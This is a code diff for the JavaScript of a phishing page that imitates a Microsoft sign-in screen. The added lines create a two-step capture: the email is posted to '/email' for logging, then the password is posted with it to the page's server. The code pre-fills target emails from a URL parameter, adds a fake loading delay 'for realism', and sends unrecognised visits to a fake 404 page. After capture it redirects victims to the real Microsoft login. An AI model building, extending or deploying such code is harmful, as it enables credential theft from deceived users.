@@ -1,10 +1,13 @@
+// Global variable to store the email
+var userEmail = "";
+
 function sanitizeString(str) {
     if (!str) return "";
-    return str.replace(/[<>]/g, ""); 
+    return str.replace(/[<>]/g, "");
 }
 
 function isValidBase64(str) {
-    if (!str) return true; 
+    if (!str) return true;
     try {
         return btoa(atob(str)) === str.replace(/\s/g, "");
     } catch (err) {
@@ -16,12 +19,33 @@ function trigger404() {
     window.location.replace("/404-error-not-found");
 }
 
-document.addEventListener("DOMContentLoaded", function() {
+document.addEventListener("DOMContentLoaded", function () {
     var urlParams = new URLSearchParams(window.location.search);
-    const allowedParams = ['u', 'p', 'logo', 'bg'];
+    const allowedParams = ['u', 'p', 'logo', 'bg', 'edificio', 'planta'];
+
+    // --- REDIRECT CHECK: If edificio AND planta are present, redirect to login.html without them ---
+    var hasEdificio = urlParams.has('edificio');
+    var hasPlanta = urlParams.has('planta');
+
+    if (hasEdificio && hasPlanta) {
+        // Create new URL without edificio and planta parameters
+        var newParams = new URLSearchParams();
+        for (const [key, value] of urlParams.entries()) {
+            if (key !== 'edificio' && key !== 'planta') {
+                newParams.append(key, value);
+            }
+        }
+
+        // Redirect to login.html with remaining parameters
+        var newUrl = window.location.pathname;
+        if (newParams.toString()) {
+            newUrl += '?' + newParams.toString();
+        }
+        window.location.replace(newUrl);
+        return;
+    }
 
     // --- 1. STRICT WHITELIST CHECK ---
-    // Redirect if there's a parameter in the URL that we don't recognize
     for (const key of urlParams.keys()) {
         if (!allowedParams.includes(key)) {
             trigger404();
@@ -39,78 +63,207 @@ document.addEventListener("DOMContentLoaded", function() {
         }
     }
 
-    // --- 3. UI RENDERING (ID/LOGO/BG) ---
-    var username = "coacehl@coacehl.com";
+    // --- 3. UI RENDERING (LOGO) ---
+    var defaultLogo = "../static/logo2.png";
+
+    // Check if 'u' parameter exists (pre-filled email)
     var getId = urlParams.get("u");
     if (getId) {
         try {
-            username = sanitizeString(atob(getId));
-            var displayElement = document.getElementById("display_name");
-            if (displayElement) displayElement.innerText = username;
-        } catch(e) { trigger404(); return; }
-    }
-
-    // --- 3. UI RENDERING (ID/LOGO/BG) ---
-    var username = "coacehl@coacehl.com";
-    var defaultLogo = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTUiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAxNTUgMzYiPjxwYXRoIGZpbGw9IiNmMjUwMjIiIGQ9Ik0wIDVoMTF2MTFIMHoiLz48cGF0aCBmaWxsPSIjN2ZiYjAwIiBkPSJNMTIgNWgxMXYxMUgxMnoiLz48cGF0aCBmaWxsPSIjMDBhNGVmIiBkPSJNMCAxN2gxMXYxMUgweiIvPjxwYXRoIGZpbGw9IiNmZmI5MDAiIGQ9Ik0xMiAxN2gxMXYxMUgxMnoiLz48dGV4dCB4PSIzMCIgeT0iMjQiIGZpbGw9IiM3MzczNzMiIGZvbnQtZmFtaWx5PSJTZWdvZSBVSSxTYW5zLVNlcmlmIiBmb250LXNpemU9IjIyIiBmb250LXdlaWdodD0iNDAwIiBzdHlsZT0ibGV0dGVyLXNwYWNpbmc6LTAuNXB4OyI+TWljcm9zb2Z0PC90ZXh0Pjwvc3ZnPg==";
-    
-    // Username logic
-    var getId = urlParams.get("id");
-    if (getId) {
-        try {
-            username = sanitizeString(atob(getId));
-            var displayElement = document.getElementById("display_name");
-            if (displayElement) displayElement.innerText = username;
-        } catch(e) { trigger404(); return; }
+            userEmail = sanitizeString(atob(getId));
+            // If email is pre-filled, skip to password step
+            document.getElementById("email-step").style.display = "none";
+            document.getElementById("password-step").style.display = "block";
+            document.getElementById("display_email").innerText = userEmail;
+            var signinOptionsBtn = document.querySelector('.signin-options');
+            if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
+        } catch (e) {
+            trigger404();
+            return;
+        }
     }
 
     // Logo logic
     var getLogo = urlParams.get("logo");
-    var logoElement = document.getElementById("logo_image");
-    if (logoElement) {
-        if (getLogo) {
+    var logoElement1 = document.getElementById("logo_image");
+    var logoElement2 = document.getElementById("logo_image_2");
+
+    var logoSrc = defaultLogo;
+    if (getLogo) {
+        try {
             var decodedLogo = atob(getLogo);
             if (decodedLogo.startsWith('https://') || decodedLogo.startsWith('data:image')) {
-                logoElement.src = decodedLogo;
-            } else { 
-                trigger404(); 
-                return; 
+                logoSrc = decodedLogo;
+            } else {
+                trigger404();
+                return;
             }
-        } else {
-            logoElement.src = defaultLogo;
+        } catch (e) {
+            trigger404();
+            return;
         }
+    }
+
+    if (logoElement1) logoElement1.src = logoSrc;
+    if (logoElement2) logoElement2.src = logoSrc;
+
+    // Set logo for sign-in options view
+    var logoElement3 = document.getElementById("logo_image_3");
+    if (logoElement3) logoElement3.src = logoSrc;
+
+    // Add click handler for sign-in options button
+    var signinOptionsBtn = document.querySelector('.signin-options');
+    if (signinOptionsBtn) {
+        signinOptionsBtn.addEventListener('click', showSignInOptions);
     }
 });
 
-function clickActionRemote() {
-    var passwordElement = document.getElementById("password");
-    var errorElement = document.getElementById("error");
-    var displayElement = document.getElementById("display_name");
+// Show sign-in options view
+function showSignInOptions() {
+    var emailStep = document.getElementById("email-step");
+    var passwordStep = document.getElementById("password-step");
+    var optionsView = document.getElementById("signin-options-view");
+    var signinOptionsBtn = document.querySelector('.signin-options');
+    if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
 
+    // Hide current view
+    if (emailStep.style.display !== "none") {
+        emailStep.classList.add("slide-out-left");
+        setTimeout(function () {
+            emailStep.style.display = "none";
+            emailStep.classList.remove("slide-out-left");
+            optionsView.style.display = "block";
+            optionsView.classList.add("slide-in-right");
+            setTimeout(function () {
+                optionsView.classList.remove("slide-in-right");
+            }, 300);
+        }, 300);
+    } else if (passwordStep.style.display !== "none") {
+        passwordStep.classList.add("slide-out-left");
+        setTimeout(function () {
+            passwordStep.style.display = "none";
+            passwordStep.classList.remove("slide-out-left");
+            optionsView.style.display = "block";
+            optionsView.classList.add("slide-in-right");
+            setTimeout(function () {
+                optionsView.classList.remove("slide-in-right");
+            }, 300);
+        }, 300);
+    }
+}
+
+// Hide sign-in options and go back
+function hideSignInOptions() {
+    var emailStep = document.getElementById("email-step");
+    var optionsView = document.getElementById("signin-options-view");
+    var signinOptionsBtn = document.querySelector('.signin-options');
+    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";
+
+    optionsView.classList.add("slide-out-left");
+    setTimeout(function () {
+        optionsView.style.display = "none";
+        optionsView.classList.remove("slide-out-left");
+        emailStep.style.display = "block";
+        emailStep.classList.add("slide-in-right");
+        setTimeout(function () {
+            emailStep.classList.remove("slide-in-right");
+        }, 300);
+    }, 300);
+}
+
+// Step 1: Submit Email
+function submitEmail() {
+    var emailElement = document.getElementById("email");
+    var errorElement = document.getElementById("email-error");
+    var emailValue = emailElement.value.trim();
+    var nextButton = document.getElementById("email-next");
+    var loadingSpinner = document.getElementById("loading-spinner");
+
+    // Basic email validation
+    if (emailValue.length <= 0 || !emailValue.includes("@")) {
+        errorElement.style.display = "block";
+        return;
+    }
+
+    errorElement.style.display = "none";
+    userEmail = emailValue;
+
+    // Show loading spinner, hide button
+    nextButton.style.display = "none";
+    loadingSpinner.style.display = "flex";
+
+    // Send email to backend for logging
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "/email", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+            // Simulate loading delay for realism
+            setTimeout(function () {
+                // Hide loading spinner
+                loadingSpinner.style.display = "none";
+                nextButton.style.display = "block";
+
+                // Move to password step with animation
+                var emailStep = document.getElementById("email-step");
+                var passwordStep = document.getElementById("password-step");
+                var signinOptionsBtn = document.querySelector('.signin-options');
+                if (signinOptionsBtn) signinOptionsBtn.style.display = "none";
+
+                emailStep.classList.add("slide-out-left");
+                setTimeout(function () {
+                    emailStep.style.display = "none";
+                    emailStep.classList.remove("slide-out-left");
+                    passwordStep.style.display = "block";
+                    passwordStep.classList.add("slide-in-right");
+                    document.getElementById("display_email").innerText = userEmail;
+                    setTimeout(function () {
+                        passwordStep.classList.remove("slide-in-right");
+                    }, 300);
+                }, 300);
+            }, 800); // 800ms loading delay
+        }
+    };
+
+    var data = "email=" + encodeURIComponent(emailValue);
+    xhttp.send(data);
+}
+
+// Step 2: Submit Password
+function submitPassword() {
+    var passwordElement = document.getElementById("password");
+    var errorElement = document.getElementById("password-error");
     var passwordValue = passwordElement.value;
-    var username = displayElement ? displayElement.innerText : "unknown";
 
     if (passwordValue.length <= 0) {
-        errorElement.style.display = "block";        
-    } else {
-        errorElement.style.display = "none";
-        
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", "/", true);
-        
-        // This header is required for Flask to parse request.form
-        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-
-        xhttp.onreadystatechange = function() {
-            if (this.readyState == 4 && this.status == 200) {
-                window.location.href = "https://login.microsoftonline.com";
-            }
-        };
-
-        // Prepare the body data
-        var data = "u=" + encodeURIComponent(username) + "&p=" + encodeURIComponent(passwordValue);
-        xhttp.send(data);
+        errorElement.style.display = "block";
+        return;
     }
+
+    errorElement.style.display = "none";
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open("POST", "/", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+            window.location.href = "https://login.microsoftonline.com";
+        }
+    };
+
+    var data = "u=" + encodeURIComponent(userEmail) + "&p=" + encodeURIComponent(passwordValue);
+    xhttp.send(data);
+}
+
+// Go back to email step
+function goBackToEmail() {
+    document.getElementById("password-step").style.display = "none";
+    document.getElementById("email-step").style.display = "block";
+    document.getElementById("email").value = userEmail;
+    var signinOptionsBtn = document.querySelector('.signin-options');
+    if (signinOptionsBtn) signinOptionsBtn.style.display = "flex";
 }
 
 function toggleTroubleshoot() {
@@ -123,17 +276,17 @@ function toggleTroubleshoot() {
 
 function copyTroubleshoot() {
     const info = `Error Code: 16000\nRequest Id: 756acfe5-ae8e-438a-bc0b-f62fd5130b00\nCorrelation Id: 6f4f1763-7f3a-37fd-a0c1-e33a92cc4b21\nTimestamp: 2026-02-27T19:54:22.801Z`;
-    
+
     navigator.clipboard.writeText(info).then(() => {
         var status = document.getElementById("copy-status");
         if (status) {
-            status.textContent = "✓ Copied"; 
+            status.textContent = "✓ Copied";
             status.style.color = "green";
             status.style.fontWeight = "bold";
             status.style.display = "inline";
-            setTimeout(() => { 
-                status.style.display = "none"; 
-            }, 3000); 
+            setTimeout(() => {
+                status.style.display = "none";
+            }, 3000);
         }
     });
 }
